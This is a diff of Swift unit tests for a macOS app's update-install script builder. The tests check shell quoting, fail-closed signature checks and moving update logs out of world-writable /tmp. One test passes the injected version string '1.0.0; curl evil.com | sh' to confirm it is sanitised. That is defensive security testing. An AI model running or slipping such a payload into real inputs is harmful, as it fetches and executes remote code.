@@ -44,7 +44,8 @@ final class UpdateInstallScriptBuilderTests: XCTestCase {
         let script = UpdateInstallScriptBuilder.script(
             stableDMGPath: "/tmp/Pastry.dmg",
             targetPath: "/Applications/Pastry.app",
-            expectedVersion: "1.2.3"
+            expectedVersion: "1.2.3",
+            updateDirectory: "/Users/x/Library/Application Support/Pastry"
         )
         XCTAssertTrue(script.contains("DMG='/tmp/Pastry.dmg'"))
         XCTAssertTrue(script.contains("TARGET='/Applications/Pastry.app'"))
@@ -52,11 +53,55 @@ final class UpdateInstallScriptBuilderTests: XCTestCase {
         XCTAssertTrue(script.hasPrefix("#!/bin/bash"))
     }
 
+    func testScriptKeepsDiagnosticsInsideAppDirectory() {
+        let script = UpdateInstallScriptBuilder.script(
+            stableDMGPath: "/tmp/Pastry.dmg",
+            targetPath: "/Applications/Pastry.app",
+            expectedVersion: "1.2.3",
+            updateDirectory: "/Users/x/Library/Application Support/Pastry"
+        )
+
+        XCTAssertTrue(script.contains("UPDATE_DIR='/Users/x/Library/Application Support/Pastry'"))
+        XCTAssertTrue(script.contains(#"LOG="$UPDATE_DIR/update.log""#))
+        XCTAssertTrue(script.contains(#"ERROR_FILE="$UPDATE_DIR/update_error.txt""#))
+        // /tmp 是固定且世界可写的路径：其他本机账户可伪造「更新失败」文本并在应用窗口里展示
+        XCTAssertFalse(script.contains("/tmp/pastry_update_error.txt"))
+        XCTAssertFalse(script.contains("/tmp/pastry_update.log"))
+    }
+
+    func testScriptFailsClosedWhenCurrentSignatureRequirementUnreadable() {
+        let script = UpdateInstallScriptBuilder.script(
+            stableDMGPath: "/tmp/Pastry.dmg",
+            targetPath: "/Applications/Pastry.app",
+            expectedVersion: "1.2.3",
+            updateDirectory: "/Users/x/Library/Application Support/Pastry"
+        )
+
+        XCTAssertTrue(script.contains("fail_update \"无法读取当前 App 的签名要求，拒绝自动更新\""))
+        XCTAssertFalse(
+            script.contains("跳过签名身份连续性校验"),
+            "读不到 designated requirement 时必须拒绝，而不是降级为只校验签名有效性"
+        )
+    }
+
+    func testScriptDetachFailureDoesNotSkipRelaunch() {
+        let script = UpdateInstallScriptBuilder.script(
+            stableDMGPath: "/tmp/Pastry.dmg",
+            targetPath: "/Applications/Pastry.app",
+            expectedVersion: "1.2.3",
+            updateDirectory: "/Users/x/Library/Application Support/Pastry"
+        )
+
+        // set -e 下 detach 失败会中断脚本，导致更新完成后应用不再启动
+        XCTAssertTrue(script.contains(#"hdiutil detach "$VOLUME" -quiet || true"#))
+    }
+
     func testScriptRejectsMaliciousVersionToSafeFallback() {
         let script = UpdateInstallScriptBuilder.script(
             stableDMGPath: "/tmp/x.dmg",
             targetPath: "/Applications/Pastry.app",
-            expectedVersion: "1.0.0; curl evil.com | sh"
+            expectedVersion: "1.0.0; curl evil.com | sh",
+            updateDirectory: "/tmp"
         )
         XCTAssertTrue(
             script.contains("EXPECTED_VERSION=\"0.0.0\""),
@@ -69,8 +114,10 @@ final class UpdateInstallScriptBuilderTests: XCTestCase {
         let script = UpdateInstallScriptBuilder.script(
             stableDMGPath: "/tmp/a'b.dmg",
             targetPath: "/Applications/Pastry.app",
-            expectedVersion: "1.0.0"
+            expectedVersion: "1.0.0",
+            updateDirectory: "/tmp/it's here"
         )
         XCTAssertTrue(script.contains("DMG='/tmp/a'\\''b.dmg'"))
+        XCTAssertTrue(script.contains("UPDATE_DIR='/tmp/it'\\''s here'"))
     }
 }
